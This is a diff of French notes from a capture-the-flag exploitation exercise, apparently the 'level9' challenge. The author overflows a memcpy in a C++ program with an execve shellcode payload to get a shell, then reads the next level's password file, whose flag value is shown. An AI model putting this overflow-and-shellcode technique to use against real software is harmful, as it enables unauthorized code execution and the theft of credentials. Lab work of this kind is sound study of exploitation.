@@ -13,7 +13,18 @@ on sait aussi que
    0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
 et la fonction avec le memcpy
 
-on peut choper l'adress du buffer de eax apres la function on break *0x0804867c
-et on 
-(gdb) x $eax
-0x804a00c:      0x00000061
+on a l'adresse en faisant 
+ltrace ./level9 q
+memcpy(0x0804a00c, "q", 1)          = 0x0804a00c == "\x0c\xa0\04\x08"
+
+on va try du coup  shellcode + 76 caractere + adresse
+./level9 $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '.' * 76 + '\x0c\xa0\04\x08'")
+
+bon ca marche pas et du coup j'ai trouver qu'il fallait l'adress du debut du shell code pour quelle point sur 0x0804a00c qui serra remplacé par [esp+10] 0x804a00x + 4 = 0x0804a010
+
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '.' * 76 + '\x0c\xa0\04\x08'")
+
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+let's go
